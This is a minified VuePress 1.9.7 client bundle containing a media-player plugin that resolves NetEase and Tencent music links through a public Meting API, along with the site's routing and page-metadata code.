ds(o,[{key:"InitMeting",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e,t,o,a,i,s,c=this,l=arguments;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return e=l.length>0&&void 0!==l[0]?l[0]:{},t=l.length>1?l[1]:void 0,o=[],a=e.audio||[],i=e.list||[],(e.id||e.auto)&&(i=[{id:e.id,server:e.server,type:e.type,auth:e.auth,auto:e.auto}].concat(i.map((function(n){return{id:n.id,server:n.server,type:n.type,auth:n.auth,auto:n.auto}})))),i&&i.length>0&&i.map((function(n){if(n.id||n.auto){var t=c.ParseMeting({id:n.id,server:n.server,type:n.type,auth:n.auth,auto:n.auto},e.api);t&&o.push(t)}})),s=o.map(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(e){return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return n.next=2,fetch(e);case 2:return n.abrupt("return",n.sent.json());case 3:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}()),n.next=10,Promise.all(s).then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(r){var o;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return r.map((function(n){a=a.concat(n.map((function(n){return{name:(null==n?void 0:n.name)||(null==n?void 0:n.title)||"Audio name",artist:(null==n?void 0:n.artist)||(null==n?void 0:n.author)||"Audio artist",url:null==n?void 0:n.url,cover:(null==n?void 0:n.cover)||(null==n?void 0:n.pic),lrc:(null==n?void 0:n.lrc)||(null==n?void 0:n.lyric)||"",type:(null==n?void 0:n.type)||"auto"}})))})),o={container:t,audio:a,fixed:e.fixed,mini:e.mini,autoplay:e.autoplay,loop:e.loop,order:e.order,preload:e.preload,volume:e.volume,mutex:e.mutex,lrcType:e.lrcType,listFolded:e.listFolded,listMaxHeight:e.listMaxHeight,storageName:e.storageName},c.src=o,n.abrupt("return",c.InitPlayer());case 4:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 10:return n.abrupt("return",n.sent);case 11:case"end":return n.stop()}}),n)}))),function(){return e.apply(this,arguments)})},{key:"ParseMeting",value:function(n,e){return n&&n.auto&&(n=this.ParseLink(n.auto)),n&&n.server&&n.type&&n.id?e.replace(":server",n.server).replace(":type",n.type).replace(":id",n.id).replace(":auth",n.auth).replace(":r",Math.random().toString()):""}},{key:"ParseLink",value:function(n){for(var e=0,t=[["music.163.com.*song.*id=(\\d+)","netease","song"],["music.163.com.*album.*id=(\\d+)","netease","album"],["music.163.com.*artist.*id=(\\d+)","netease","artist"],["music.163.com.*playlist.*id=(\\d+)","netease","playlist"],["music.163.com.*discover/toplist.*id=(\\d+)","netease","playlist"],["y.qq.com.*song/(\\w+).html","tencent","song"],["y.qq.com.*songDetail/(\\w+)","tencent","song"],["y.qq.com.*album/(\\w+).html","tencent","album"],["y.qq.com.*singer/(\\w+).html","tencent","artist"],["y.qq.com.*playsquare/(\\w+).html","tencent","playlist"],["y.qq.com.*playlist/(\\w+).html","tencent","playlist"],["xiami.com.*song/(\\w+)","xiami","song"],["xiami.com.*album/(\\w+)","xiami","album"],["xiami.com.*artist/(\\w+)","xiami","artist"],["xiami.com.*collect/(\\w+)","xiami","playlist"]];e<t.length;e++){var r=t[e],o=new RegExp(r[0]).exec(n);if(o)return{server:r[1],type:r[2],id:o[1]}}return console.error("无法解析的链接: ".concat(n,"，请检查链接是否书写正确")),{}}}]),o}(lc),yc=Ro.extend({props:{id:{required:!1,type:String,default:""},server:{required:!1,type:String,default:"tencent"},type:{required:!1,type:String,default:"song"},auto:{required:!1,type:String,default:""},fixed:{required:!1,type:Boolean,default:!1},mini:{required:!1,type:Boolean,default:!1},autoplay:{required:!1,type:Boolean,default:!1},theme:{required:!1,type:String,default:"#2980b9"},loop:{required:!1,type:String,default:"all"},order:{required:!1,type:String,default:"list"},preload:{required:!1,type:String,default:"auto"},volume:{required:!1,type:Number,default:.7},mutex:{required:!1,type:Boolean,default:!0},lrcType:{required:!1,type:Number,default:3},listFolded:{required:!1,type:Boolean,default:!1},listMaxHeight:{required:!1,type:String,default:"340px"},storageName:{required:!1,type:String,default:"vuepress-plugin-smplayer"},api:{required:!1,type:String,default:"https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id&r=:r"},audio:{required:!1,type:Array},list:{required:!1,type:Array}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer"})])},data:function(){return{meting:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=n.$props,n.meting=new vc,e.next=4,n.meting.InitMeting(t,n.$refs.sbplayer);case 4:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.meting)||void 0===n||n.DestroyPlayer()}}),kc=function(){function n(e){ls(this,n),Object(oc.a)(this,"src",void 0),Object(oc.a)(this,"player",void 0),e&&(this.src=e)}var e;return ds(n,[{key:"InitPlayer",value:(e=Object(r.a)(regeneratorRuntime.mark((function n(){var e,o,a,i,s,c=this;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(!this.src){n.next=24;break}if(null!==(e=this.src)&&void 0!==e&&e.type||"string"!=typeof(null===(o=this.src)||void 0===o?void 0:o.url)||(this.src.url.toLowerCase().endsWith(".m3u8")?this.src.type="hls":this.src.url.toLowerCase().endsWith(".flv")?this.src.type="flv":this.src.url.toLowerCase().endsWith(".mpd")&&(this.src.type="shaka")),s=t.e(0).then(t.t.bind(null,389,7)),null===(a=this.src)||void 0===a||!a.type||"string"!=typeof this.src.type){n.next=20;break}n.t0=this.src.type.toLowerCase(),n.next="hls"===n.t0||"m3u8"===n.t0?7:"flv"===n.t0?9:"dash"===n.t0?11:"shakadash"===n.t0||"shaka"===n.t0||"shaka-dash"===n.t0?13:"music"===n.t0?15:17;break;case 7:return i=Promise.all([Promise.all([t.e(0),t.e(72)]).then(t.t.bind(null,484,7)),s]),n.abrupt("break",18);case 9:return i=Promise.all([Promise.all([t.e(0),t.e(71)]).then(t.t.bind(null,485,7)),s]),n.abrupt("break",18);case 11:return i=Promise.all([Promise.all([t.e(0),t.e(70)]).then(t.t.bind(null,486,7)),s]),n.abrupt("break",18);case 13:return i=Promise.all([Promise.all([t.e(0),t.e(74)]).then(t.t.bind(null,487,7)),s]),n.abrupt("break",18);case 15:return i=Promise.all([Promise.all([t.e(0),t.e(73)]).then(t.t.bind(null,488,7)),s]),n.abrupt("break",18);case 17:i=t.e(0).then(t.t.bind(null,389,7));case 18:n.next=21;break;case 20:i=Promise.all([s]);case 21:return n.next=23,i.then(function(){var n=Object(r.a)(regeneratorRuntime.mark((function n(e){var t,r,o;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:if(r=Object(Wi.a)(e,1),o=r[0].default,null===(t=c.src)||void 0===t||!t.customInit){n.next=7;break}return n.next=4,c.src.customInit(o,c.src).then((function(n){return n}));case 4:n.t0=n.sent,n.next=8;break;case 7:n.t0=new o(c.src);case 8:return c.player=n.t0,n.abrupt("return",c.player);case 10:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}());case 23:return n.abrupt("return",n.sent);case 24:case"end":return n.stop()}}),n,this)}))),function(){return e.apply(this,arguments)})},{key:"DestroyPlayer",value:function(){var n;null===(n=this.player)||void 0===n||n.destroy()}},{key:"AddOnEvent",value:function(n){var e=this;n&&this.player&&Object.keys(n).forEach((function(t){e.player.on(t,(function(){return n[t](e.player,e.src)}))}))}}]),n}(),xc=Ro.extend({props:{src:{type:Object,required:!0},on:{type:Object,default:function(){return{}},required:!1},width:{type:String,default:"100%",required:!1},height:{type:Array,default:function(){return{src:{url:"",fluid:!0,fitVideoSize:"auto"},width:"100%",on:{}}.height},required:!1}},render:function(){var n=arguments[0];return n("div",{class:"smplayer"},[n("div",{ref:"sbplayer",style:"width: ".concat(this.width)})])},data:function(){return{player:{}}},mounted:function(){var n=this;return Object(r.a)(regeneratorRuntime.mark((function e(){var t,r;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return t=sc()({},n.on),r=Object(rc.a)(Object(rc.a)({},sc()({url:"",fluid:!0,fitVideoSize:"auto"},n.src)),{},{el:n.$refs.sbplayer}),n.player=new kc(r),e.next=5,n.player.InitPlayer();case 5:n.player.AddOnEvent(t);case 6:case"end":return e.stop()}}),e)})))()},beforeDestroy:function(){var n;null===(n=this.player)||void 0===n||n.DestroyPlayer()}}),wc=[function(n){var e=n.Vue,t=(n.options,n.router,n.siteData);t.pages.map((function(n){var e=n.frontmatter,r=e.date,o=e.author;"string"==typeof r&&"Z"===r.charAt(r.length-1)&&(n.frontmatter.date=function(n){n instanceof Date||(n=new Date(n));return"".concat(n.getUTCFullYear(),"-").concat(nc(n.getUTCMonth()+1),"-").concat(nc(n.getUTCDate())," ").concat(nc(n.getUTCHours()),":").concat(nc(n.getUTCMinutes()),":").concat(nc(n.getUTCSeconds()))}(r)),o?n.author=o:t.themeConfig.author&&(n.author=t.themeConfig.author)})),e.mixin(Zs)},{},function(n){n.Vue.mixin({computed:{$dataBlock:function(){return this.$options.__data__block__}}})},{},{},function(n){var e=n.Vue;e.component("Bilibili",ec),e.component("Xigua",tc),e.component("DPlayer",cc),e.component("APlayer",pc),e.component("Artplayer",uc),e.component("Meting",yc),e.component("metingJs",yc),e.component("Xgplayer",xc)}],jc=[];t(148);var Sc=function(n){fc(t,n);var e=hc(t);function t(){return ls(this,t),e.apply(this,arguments)}return ds(t)}(function(){function n(){ls(this,n),this.store=new Ro({data:{state:{}}})}return ds(n,[{key:"$get",value:function(n){return this.store.state[n]}},{key:"$set",value:function(n,e){Ro.set(this.store.state,n,e)}},{key:"$emit",value:function(){var n;(n=this.store).$emit.apply(n,arguments)}},{key:"$on",value:function(){var n;(n=this.store).$on.apply(n,arguments)}}]),n}());Object.assign(Sc.prototype,{getPageAsyncComponent:Fi,getLayoutAsyncComponent:Ui,getAsyncComponent:Vi,getVueComponent:Ji});var Ec={install:function(n){var e=new Sc;n.$vuepress=e,n.prototype.$vuepress=e}};function Ac(n){n.beforeEach((function(e,t,r){if(Pc(n,e.path))r();else if(/(\/|\.html)$/.test(e.path))if(/\/$/.test(e.path)){var o=e.path.replace(/\/$/,"")+".html";Pc(n,o)?r(o):r()}else r();else{var a=e.path+"/",i=e.path+".html";Pc(n,i)?r(i):Pc(n,a)?r(a):r()}}))}function Pc(n,e){var t=e.toLowerCase();return n.options.routes.some((function(n){return n.path.toLowerCase()===t}))}var Cc={props:{pageKey:String,slotKey:{type:String,default:"default"}},render:function(n){var e=this.pageKey||this.$parent.$page.key;return Gi("pageKey",e),Ro.component(e)||Ro.component(e,Fi(e)),Ro.component(e)?n(e):n("")}},Tc={functional:!0,props:{slotKey:String,required:!0},render:function(n,e){var t=e.props,r=e.slots;return n("div",{class:["content__".concat(t.slotKey)]},r()[t.slotKey])}},Ic={computed:{openInNewWindowTitle:function(){return this.$themeLocaleConfig.openNewWindowText||"(opens new window)"}}},_c=(t(386),t(387),Object(Hs.a)(Ic,(function(){var n=this.$createElement,e=this._self._c||n;return e("span",[e("svg",{staticClass:"icon outbound",attrs:{xmlns:"http://www.w3.org/2000/svg","aria-hidden":"true",focusable:"false",x:"0px",y:"0px",viewBox:"0 0 100 100",width:"15",height:"15"}},[e("path",{attrs:{fill:"currentColor",d:"M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"}}),this._v(" "),e("polygon",{attrs:{fill:"currentColor",points:"45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"}})]),this._v(" "),e("span",{staticClass:"sr-only"},[this._v(this._s(this.openInNewWindowTitle))])])}),[],!1,null,null,null).exports);function Bc(){return(Bc=Object(r.a)(regeneratorRuntime.mark((function n(e){var t,r,o,a;return regeneratorRuntime.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return t="undefined"!=typeof window&&window.__VUEPRESS_ROUTER_BASE__?window.__VUEPRESS_ROUTER_BASE__:Ks.routerBase||Ks.base,Ac(r=new Si({base:t,mode:"history",fallback:!1,routes:Ws,scrollBehavior:function(n,e,t){return t||(n.hash?!Ro.$vuepress.$get("disableScrollBehavior")&&{selector:decodeURIComponent(n.hash)}:{x:0,y:0})}})),o={},n.prev=4,n.next=7,Promise.all(wc.filter((function(n){return"function"==typeof n})).map((function(n){return n({Vue:Ro,options:o,router:r,siteData:Ks,isServer:e})})));case 7:n.next=12;break;case 9:n.prev=9,n.t0=n.catch(4),console.error(n.t0);case 12:return a=new Ro(Object.assign(o,{router:r,render:function(n){return n("div",{attrs:{id:"app"}},[n("RouterView",{ref:"layout"}),n("div",{class:"global-ui"},jc.map((function(e){return n(e)})))])}})),n.abrupt("return",{app:a,router:r});case 14:case"end":return n.stop()}}),n,null,[[4,9]])})))).apply(this,arguments)}Ro.config.productionTip=!1,Ro.use(Si),Ro.use(Ec),Ro.mixin(function(n,e){var t=arguments.length>2&&void 0!==arguments[2]?arguments[2]:Ro;Ei(e),t.$vuepress.$set("siteData",e);var r=n(t.$vuepress.$get("siteData")),o=new r,a=Object.getOwnPropertyDescriptors(Object.getPrototypeOf(o)),i={};return Object.keys(a).reduce((function(n,e){return e.startsWith("$")&&(n[e]=a[e].get),n}),i),{computed:i}}((function(n){return function(){function e(){ls(this,e)}return ds(e,[{key:"setPage",value:function(n){this.__page=n}},{key:"$site",get:function(){return n}},{key:"$themeConfig",get:function(){return this.$site.themeConfig}},{key:"$frontmatter",get:function(){return this.$page.frontmatter}},{key:"$localeConfig",get:function(){var n,e,t=this.$site.locales,r=void 0===t?{}:t;for(var o in r)"/"===o?e=r[o]:0===this.$page.path.indexOf(o)&&(n=r[o]);return n||e||{}}},{key:"$siteTitle",get:function(){return this.$localeConfig.title||this.$site.title||""}},{key:"$canonicalUrl",get:function(){var n=this.$page.frontmatter.canonicalUrl;return"string"==typeof n&&n}},{key:"$title",get:function(){var n=this.$page,e=this.$page.frontmatter.metaTitle;if("string"==typeof e)return e;var t=this.$siteTitle,r=n.frontmatter.home?null:n.frontmatter.title||n.title;return t?r?r+" | "+t:t:r||"VuePress"}},{key:"$description",get:function(){var n=function(n){if(n){var e=n.filter((function(n){return"description"===n.name}))[0];if(e)return e.content}}(this.$page.frontmatter.meta);return n||(this.$page.frontmatter.description||this.$localeConfig.description||this.$site.description||"")}},{key:"$lang",get:function(){return this.$page.frontmatter.lang||this.$localeConfig.lang||"en-US"}},{key:"$localePath",get:function(){return this.$localeConfig.path||"/"}},{key:"$themeLocaleConfig",get:function(){return(this.$site.themeConfig.locales||{})[this.$localePath]||{}}},{key:"$page",get:function(){return this.__page?this.__page:function(n,e){for(var t=0;t<n.length;t++){var r=n[t];if(r.path.toLowerCase()===e.toLowerCase())return r}return{path:"",frontmatter:{}}}(this.$site.pages,this.$route.path)}}]),e}()}),Ks)),Ro.component("Content",Cc),Ro.component("ContentSlotsDistributor",Tc),Ro.component("OutboundLink",_c),Ro.component("ClientOnly",{functional:!0,render:function(n,e){var t=e.parent,r=e.children;if(t._isMounted)return r;t.$once("hook:mounted",(function(){t.$forceUpdate()}))}}),Ro.component("Layout",Ui("Layout")),Ro.component("NotFound",Ui("NotFound")),Ro.prototype.$withBase=function(n){var e=this.$site.base;return"/"===n.charAt(0)?e+n.slice(1):n},window.__VUEPRESS__={version:"1.9.7",hash:"18360fb"},function(n){return Bc.apply(this,arguments)}(!1).then((function(n){var e=n.app;n.router.onReady((function(){e.$mount("#app")}))}))}]);